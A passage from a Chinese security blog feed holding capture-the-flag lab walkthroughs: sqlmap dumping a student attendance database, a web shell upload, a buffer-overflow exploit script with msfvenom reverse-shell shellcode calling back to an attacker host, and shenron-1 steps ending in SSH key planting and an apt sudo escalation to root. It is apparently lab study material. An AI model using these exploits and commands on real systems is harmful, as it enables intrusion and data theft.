class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] student_attendance_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 -D "student_attendance_db" --tables</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">+-------------------+</span><br><span class="line">| attendance_list   |</span><br><span class="line">| attendance_record |</span><br><span class="line">| class             |</span><br><span class="line">| class_subject     |</span><br><span class="line">| courses           |</span><br><span class="line">| faculty           |</span><br><span class="line">| students          |</span><br><span class="line">| subjects          |</span><br><span class="line">| system_settings   |</span><br><span class="line">| users             |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 -D "student_attendance_db" --dump</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: attendance_list</span><br><span class="line">[1 entry]</span><br><span class="line">+----+------------------+------------+---------------------+</span><br><span class="line">| id | class_subject_id | doc        | date_created        |</span><br><span class="line">+----+------------------+------------+---------------------+</span><br><span class="line">| 1  | 1                | 2020-10-28 | 2020-10-28 20:06:37 |</span><br><span class="line">+----+------------------+------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db                                                                                                                                                                                  </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------+------+-------------------+---------------------------------------------+</span><br><span class="line">| id | faculty_id | name          | type | username          | password                                    |</span><br><span class="line">+----+------------+---------------+------+-------------------+---------------------------------------------+</span><br><span class="line">| 1  | 0          | Administrator | 1    | admin             | 0192023a7bbd73250516f069df18b500 (admin123) |</span><br><span class="line">| 2  | 1          | John Smith    | 3    | jsmith@sample.com | af606ddc433ae6471f104872585cf880            |</span><br><span class="line">+----+------------+---------------+------+-------------------+---------------------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: students</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+----------+---------------+---------------------+</span><br><span class="line">| id | id_no    | class_id | name          | date_created        |</span><br><span class="line">+----+----------+----------+---------------+---------------------+</span><br><span class="line">| 1  | 06232014 | 2        | Claire Blake  | 2020-10-28 11:53:24 |</span><br><span class="line">| 2  | 123456   | 2        | George Wilson | 2020-10-28 15:20:57 |</span><br><span class="line">+----+----------+----------+---------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: courses</span><br><span class="line">[4 entries]</span><br><span class="line">+----+---------------+---------------+---------------------+</span><br><span class="line">| id | course        | description   | date_created        |</span><br><span class="line">+----+---------------+---------------+---------------------+</span><br><span class="line">| 1  | Sample Course | Sample Course | 2020-10-28 10:00:41 |</span><br><span class="line">| 2  | Course 2      |  Course 2     | 2020-10-28 10:02:09 |</span><br><span class="line">| 3  | Course 3      |  Course 3     | 2020-10-28 10:02:16 |</span><br><span class="line">| 4  | Course 4      |  Course 4     | 2020-10-28 10:02:24 |</span><br><span class="line">+----+---------------+---------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: attendance_record</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------+------+---------------------+</span><br><span class="line">| id | student_id | attendance_id | type | date_created        |</span><br><span class="line">+----+------------+---------------+------+---------------------+</span><br><span class="line">| 1  | 1          | 1             | 1    | 2020-10-28 20:06:37 |</span><br><span class="line">| 2  | 2          | 1             | 2    | 2020-10-28 20:06:37 |</span><br><span class="line">+----+------------+---------------+------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: subjects</span><br><span class="line">[3 entries]</span><br><span class="line">+----+------------+-------------+---------------------+</span><br><span class="line">| id | subject    | description | date_created        |</span><br><span class="line">+----+------------+-------------+---------------------+</span><br><span class="line">| 1  | Subject 1  | Subject 1   | 2020-10-28 10:29:53 |</span><br><span class="line">| 2  | Subject 2  | Subject 2   | 2020-10-28 10:30:48 |</span><br><span class="line">| 3  | Subject 3  | Subject 3   | 2020-10-28 10:30:57 |</span><br><span class="line">+----+------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: faculty</span><br><span class="line">[1 entry]</span><br><span class="line">+----+----------+------------+-------------------+----------------+-------------+---------------------+</span><br><span class="line">| id | id_no    | name       | email             | contact        | address     | date_created        |</span><br><span class="line">+----+----------+------------+-------------------+----------------+-------------+---------------------+</span><br><span class="line">| 1  | 06232014 | John Smith | jsmith@sample.com | +18456-5455-55 | Sample Only | 2020-10-28 11:32:18 |</span><br><span class="line">+----+----------+------------+-------------------+----------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: class_subject</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+------------+------------+-------------+---------------------+</span><br><span class="line">| id | class_id | faculty_id | subject_id | student_ids | date_created        |</span><br><span class="line">+----+----------+------------+------------+-------------+---------------------+</span><br><span class="line">| 1  | 2        | 1          | 1          | &lt;blank&gt;     | 0000-00-00 00:00:00 |</span><br><span class="line">| 2  | 1        | 1          | 2          | &lt;blank&gt;     | 0000-00-00 00:00:00 |</span><br><span class="line">+----+----------+------------+------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: system_settings</span><br><span class="line">[1 entry]</span><br><span class="line">+----+---------+---------+---------+----------------------+---------------+</span><br><span class="line">| id | name    | email   | contact | cover_img            | about_content |</span><br><span class="line">+----+---------+---------+---------+----------------------+---------------+</span><br><span class="line">| 1  | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; | 1604743980_shell.php | &lt;blank&gt;       |</span><br><span class="line">+----+---------+---------+---------+----------------------+---------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: class</span><br><span class="line">[3 entries]</span><br><span class="line">+----+-----------+--------+---------+-----------+---------------------+</span><br><span class="line">| id | course_id | status | level   | section   | date_created        |</span><br><span class="line">+----+-----------+--------+---------+-----------+---------------------+</span><br><span class="line">| 1  | 2         | 1      | 1       | B         | 2020-10-28 10:48:45 |</span><br><span class="line">| 2  | 2         | 1      | 1       | A         | 2020-10-28 10:52:58 |</span><br><span class="line">| 3  | 4         | 1      | 8       | 8         | 2021-02-20 05:33:52 |</span><br><span class="line">+----+-----------+--------+---------+-----------+---------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li><code>md5</code>解密</li>
</ul>
<p><img data-src="./school/7.png" alt></p>
<p>目前的账号密码为:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin / admin123</span><br><span class="line">jsmith@sample.com / 06232014</span><br></pre></td></tr></table></figure>

<ul>
<li>备注:这里登录后发现一些垂直越权问题</li>
</ul>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><ul>
<li>前文知道，数据库中有一个系统设置的表(system_settings)</li>
</ul>
<p><img data-src="./school/8.png" alt></p>
<ul>
<li>找到隐藏文件上传点</li>
</ul>
<p><img data-src="./school/9.png" alt></p>
<p><img data-src="./school/10.png" alt></p>
<ul>
<li>反弹<code>shell</code></li>
</ul>
<p><img data-src="./school/11.png" alt></p>
<p><img data-src="./school/12.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img data-src="./school/13.png" alt></p>
<h3 id="后台shell"><a href="#后台shell" class="headerlink" title="后台shell"></a>后台shell</h3><p><img data-src="./school/14.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">e4ed03b4852906b6cb716fc6ce0f9fd5 (失败) 这是第一个flag</span><br></pre></td></tr></table></figure>

<ul>
<li>第二个 <code>flag</code></li>
</ul>
<p><img data-src="./school/15.png" alt></p>
<p>突破口出在这个 <code>wine /opt/access/access.exe</code> 上面</p>
<p><img data-src="./school/16.png" alt></p>
<p>脱下来参考网上<code>exp</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成shellcode</span></span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.106 LPORT=4444 -b '\x00\x0a\x4d\x4f\x5f\x79\x7e\x7f' -f python</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"># exp.py</span><br><span class="line">import socket</span><br><span class="line">buf&#x3D;b&#39;&#39;</span><br><span class="line">target_ip&#x3D;&#39;192.168.1.102&#39;</span><br><span class="line">target_port&#x3D;23</span><br><span class="line">recv_buf&#x3D;4096</span><br><span class="line">junk &#x3D; b&#39;a&#39; * 1902</span><br><span class="line">ret_addr&#x3D;b&#39;\xd0\x12\x50\x62&#39;</span><br><span class="line">#nops&#x3D;b&#39;\x90&#39;*32   可选</span><br><span class="line">buf +&#x3D; b&quot;\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x76\x0e\xf0\xea\x7a\x82\x83\xee\xfc\xe2\xf4\x0c\x02&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xf8\x82\xf0\xea\x1a\x0b\x15\xdb\xba\xe6\x7b\xba\x4a&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x09\xa2\xe6\xf1\xd0\xe4\x61\x08\xaa\xff\x5d\x30\xa4&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xc1\x15\xd6\xbe\x91\x96\x78\xae\xd0\x2b\xb5\x8f\xf1&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x2d\x98\x70\xa2\xbd\xf1\xd0\xe0\x61\x30\xbe\x7b\xa6&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x6b\xfa\x13\xa2\x7b\x53\xa1\x61\x23\xa2\xf1\x39\xf1&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xcb\xe8\x09\x40\xcb\x7b\xde\xf1\x83\x26\xdb\x85\x2e&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x31\x25\x77\x83\x37\xd2\x9a\xf7\x06\xe9\x07\x7a\xcb&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x97\x5e\xf7\x14\xb2\xf1\xda\xd4\xeb\xa9\xe4\x7b\xe6&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x31\x09\xa8\xf6\x7b\x51\x7b\xee\xf1\x83\x20\x63\x3e&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xa6\xd4\xb1\x21\xe3\xa9\xb0\x2b\x7d\x10\xb5\x25\xd8&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x7b\xf8\x91\x0f\xad\x82\x49\xb0\xf0\xea\x12\xf5\x83&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xd8\x25\xd6\x98\xa6\x0d\xa4\xf7\x15\xaf\x3a\x60\xeb&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x7a\x82\xd9\x2e\x2e\xd2\x98\xc3\xfa\xe9\xf0\x15\xaf&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xd2\xa0\xba\x2a\xc2\xa0\xaa\x2a\xea\x1a\xe5\xa5\x62&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x0f\x3f\xed\xe8\xf5\x82\xba\x2a\xf1\x80\x12\x80\xf0&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xfb\x26\x0b\x16\x80\x6a\xd4\xa7\x82\xe3\x27\x84\x8b&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x85\x57\x75\x2a\x0e\x8e\x0f\xa4\x72\xf7\x1c\x82\x8a&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x37\x52\xbc\x85\x57\x98\x89\x17\xe6\xf0\x63\x99\xd5&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xa7\xbd\x4b\x74\x9a\xf8\x23\xd4\x12\x17\x1c\x45\xb4&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xce\x46\x83\xf1\x67\x3e\xa6\xe0\x2c\x7a\xc6\xa4\xba&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x2c\xd4\xa6\xac\x2c\xcc\xa6\xbc\x29\xd4\x98\x93\xb6&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xbd\x76\x15\xaf\x0b\x10\xa4\x2c\xc4\x0f\xda\x12\x8a&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x77\xf7\x1a\x7d\x25\x51\x8a\x37\x52\xbc\x12\x24\x65&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x57\xe7\x7d\x25\xd6\x7c\xfe\xfa\x6a\x81\x62\x85\xef&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xc1\xc5\xe3\x98\x15\xe8\xf0\xb9\x85\x57&quot;  </span><br><span class="line">payload &#x3D; b&#39;&#39;</span><br><span class="line">payload +&#x3D; junk</span><br><span class="line">payload +&#x3D; ret_addr</span><br><span class="line">#payload +&#x3D; nops</span><br><span class="line">payload +&#x3D; buf</span><br><span class="line">with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as clientSock:</span><br><span class="line">    clientSock.connect((target_ip,target_port))    </span><br><span class="line">    data_from_srv &#x3D; clientSock.recv(recv_buf)    </span><br><span class="line">    print(f&quot;Reply --&gt; &#123;data_from_srv&#125;&quot;)    </span><br><span class="line">    print(f&quot;Sending --&gt; &#123;payload&#125;&quot;)    </span><br><span class="line">    clientSock.sendall(payload)</span><br></pre></td></tr></table></figure>

<p><img data-src="./school/17.png" alt></p>
<p><img data-src="./school/18.png" alt></p>
<p><img data-src="./school/19.png" alt></p>
<p>ok!</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>other</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>shenron-1</title>
    <url>/2021/04/26/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/shenron-1/</url>
    <content><![CDATA[<h1 id="shenron-1"><a href="#shenron-1" class="headerlink" title="shenron-1"></a>shenron-1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>shenron-1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.4.40</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.2     00:15:17:2d:50:58       Intel Corporate</span><br><span class="line">192.168.4.3     20:0d:b0:31:ce:db       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.107   08:00:27:45:50:ae       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.129   b0:f8:93:24:54:f1       Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.992 seconds (128.51 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.107</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.4.107</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.4.107</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-25 23:12 EDT</span><br><span class="line">Nmap scan report for shenron.lan (192.168.4.107)</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:45:50:AE (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/25%OT=22%CT=1%CU=34502%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=60862FC7%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0</span><br><span class="line">OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R</span><br><span class="line">OS:=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms shenron.lan (192.168.4.107)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 22.24 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./shenron-1/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.107/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# gobuster dir -u http://192.168.4.107/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.107/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 23:13:05 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/test (Status: 301)</span><br><span class="line">/joomla (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 23:15:54 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.4.107/joomla -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# gobuster dir -u http://192.168.4.107/joomla -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.107/joomla</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 23:20:24 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/media (Status: 301)</span><br><span class="line">/templates (Status: 301)</span><br><span class="line">/modules (Status: 301)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/bin (Status: 301)</span><br><span class="line">/plugins (Status: 301)</span><br><span class="line">/includes (Status: 301)</span><br><span class="line">/language (Status: 301)</span><br><span class="line">/README.txt (Status: 200)</span><br><span class="line">/components (Status: 301)</span><br><span class="line">/cache (Status: 301)</span><br><span class="line">/libraries (Status: 301)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/tmp (Status: 301)</span><br><span class="line">/LICENSE.txt (Status: 200)</span><br><span class="line">/layouts (Status: 301)</span><br><span class="line">/administrator (Status: 301)</span><br><span class="line">/configuration.php (Status: 200)</span><br><span class="line">/htaccess.txt (Status: 200)</span><br><span class="line">/cli (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 23:22:38 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./shenron-1/2.png" alt></p>
<ul>
<li>访问 <a href="http://192.168.4.107/test/" target="_blank" rel="noopener">http://192.168.4.107/test/</a></li>
</ul>
<p><img data-src="./shenron-1/3.png" alt></p>
<ul>
<li>进而获得 <code>joomla</code> 后台登录账号密码</li>
</ul>
<p><img data-src="./shenron-1/4.png" alt></p>
<p>账号密码 <code>admin / 3iqtzi4RhkWANcu@$pa$$</code></p>
<ul>
<li>登录后台</li>
</ul>
<p><img data-src="./shenron-1/5.png" alt></p>
<h3 id="拿到webshell"><a href="#拿到webshell" class="headerlink" title="拿到webshell"></a>拿到webshell</h3><p><img data-src="./shenron-1/6.png" alt></p>
<p><img data-src="./shenron-1/7.png" alt></p>
<ul>
<li>发现账号密码</li>
</ul>
<p><img data-src="./shenron-1/8.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jenny / Mypa$$wordi$notharD@123</span><br></pre></td></tr></table></figure>

<ul>
<li>水平越权到<code>jenny</code></li>
</ul>
<p><img data-src="./shenron-1/9.png" alt></p>
<ul>
<li>发现<code>jenny</code>有如下权限</li>
</ul>
<p><img data-src="./shenron-1/10.png" alt></p>
<ul>
<li>通过<code>ssh</code>公钥的方式，水平越权到<code>shenron</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">cp id_rsa.pub /tmp</span><br><span class="line">sudo -u shenron cp id_rsa.pub /home/shenron/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p><img data-src="./shenron-1/11.png" alt></p>
<ul>
<li>发现密码文件</li>
</ul>
<p><img data-src="./shenron-1/12.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shenron / YoUkNowMyPaSsWoRdIsToStRoNgDeAr</span><br></pre></td></tr></table></figure>

<p><img data-src="./shenron-1/13.png" alt></p>
<h3 id="提权-amp-amp-FLAG"><a href="#提权-amp-amp-FLAG" class="headerlink" title="提权&amp;&amp;FLAG"></a>提权&amp;&amp;FLAG</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./shenron-1/14.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>shenron</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>shenron</tag>
      </tags>
  </entry>
  <entry>
    <title>shenron-2</title>
    <url>/2021/04/25/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/shenron-2/</url>
    <content><![CDATA[<h1 id="shenron-2"><a href="#shenron-2" class="headerlink" title="shenron-2"></a>shenron-2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>shenron-2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.4.40</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.2     00:15:17:2d:50:58       Intel Corporate</span><br><span class="line">192.168.4.3     20:0d:b0:31:ce:db       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.129   b0:f8:93:24:54:f1       Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.199   08:00:27:b2:ae:e0       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.007 seconds (127.55 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.199</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.4.199</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.4.199</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-26 03:11 EDT</span><br><span class="line">Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 33.33% done; ETC: 03:11 (0:00:12 remaining)</span><br><span class="line">Nmap scan report for shenron-2.lan (192.168.4.199)</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Highlights by HTML5 UP</span><br><span class="line">8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.7</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span 